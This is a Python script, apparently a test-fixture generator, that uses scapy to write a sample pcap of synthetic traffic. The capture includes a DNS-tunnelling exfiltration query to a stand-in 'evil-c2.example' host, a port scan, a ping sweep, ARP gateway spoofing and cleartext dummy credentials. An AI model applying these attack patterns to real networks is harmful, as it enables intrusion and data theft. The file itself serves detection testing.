import base64
from pathlib import Path

from scapy.all import ARP, DNS, DNSQR, DNSRR, ICMP, IP, TCP, UDP, Ether, Raw, wrpcap

CLIENT = "192.168.1.10"
GATEWAY = "192.168.1.1"
ATTACKER = "10.0.0.99"


def client_hello(host: str) -> bytes:
    name = host.encode()
    entry = b"\x00" + len(name).to_bytes(2, "big") + name
    listing = len(entry).to_bytes(2, "big") + entry
    ext = b"\x00\x00" + len(listing).to_bytes(2, "big") + listing
    exts = len(ext).to_bytes(2, "big") + ext
    body = b"\x03\x03" + bytes(32) + b"\x00" + b"\x00\x02\x13\x01" + b"\x01\x00" + exts
    hs = b"\x01" + len(body).to_bytes(3, "big") + body
    return b"\x16\x03\x01" + len(hs).to_bytes(2, "big") + hs


def build() -> list:
    packets = [
        Ether() / IP(src=CLIENT, dst="8.8.8.8") / UDP(sport=5353, dport=53) / DNS(rd=1, qd=DNSQR(qname="example.com")),
        Ether() / IP(src="8.8.8.8", dst=CLIENT) / UDP(sport=53, dport=5353)
        / DNS(qr=1, qd=DNSQR(qname="example.com"), an=DNSRR(rrname="example.com", rdata="93.184.216.34")),
        Ether() / IP(src=CLIENT, dst="93.184.216.34") / TCP(sport=40000, dport=80, flags="S"),
        Ether() / IP(src=CLIENT, dst="93.184.216.34") / TCP(sport=40000, dport=80, flags="PA")
        / Raw(b"POST /login HTTP/1.1\r\nHost: example.com\r\nUser-Agent: demo\r\n\r\nusername=zayan&password=hunter2"),
        Ether() / IP(src=CLIENT, dst="93.184.216.34") / TCP(sport=40002, dport=80, flags="PA")
        / Raw(b"GET /admin HTTP/1.1\r\nHost: example.com\r\nAuthorization: Basic " + base64.b64encode(b"admin:admin") + b"\r\n\r\n"),
        Ether() / IP(src=CLIENT, dst="142.250.1.1") / TCP(sport=40001, dport=443, flags="PA") / Raw(client_hello("www.google.com")),
        Ether() / IP(src=CLIENT, dst="10.0.0.5") / TCP(sport=40003, dport=21, flags="PA") / Raw(b"PASS letmein\r\n"),
        Ether() / IP(src=CLIENT, dst="8.8.8.8") / UDP(sport=5354, dport=53)
        / DNS(rd=1, qd=DNSQR(qname="mfrggzdfmztwq2lknnwg23tpobyxe43uovwgy3bamnxw4zlo.evil-c2.example")),
    ]
    for port in range(1, 21):
        packets.append(Ether() / IP(src=ATTACKER, dst=CLIENT) / TCP(sport=4444, dport=port, flags="S"))
    for host in range(20, 32):
        packets.append(Ether() / IP(src=ATTACKER, dst=f"192.168.1.{host}") / ICMP())
    packets.append(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=2, psrc=GATEWAY, hwsrc="aa:aa:aa:aa:aa:aa"))
    packets.append(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=2, psrc=GATEWAY, hwsrc="bb:bb:bb:bb:bb:bb"))
    for i, pkt in enumerate(packets):
        pkt.time = 1_700_000_000 + i * 0.05
    return packets


if __name__ == "__main__":
    target = Path(__file__).resolve().parent.parent / "samples" / "sample_traffic.pcap"
    packets = build()
    wrpcap(str(target), packets)
    print(f"wrote {len(packets)} packets to {target}")
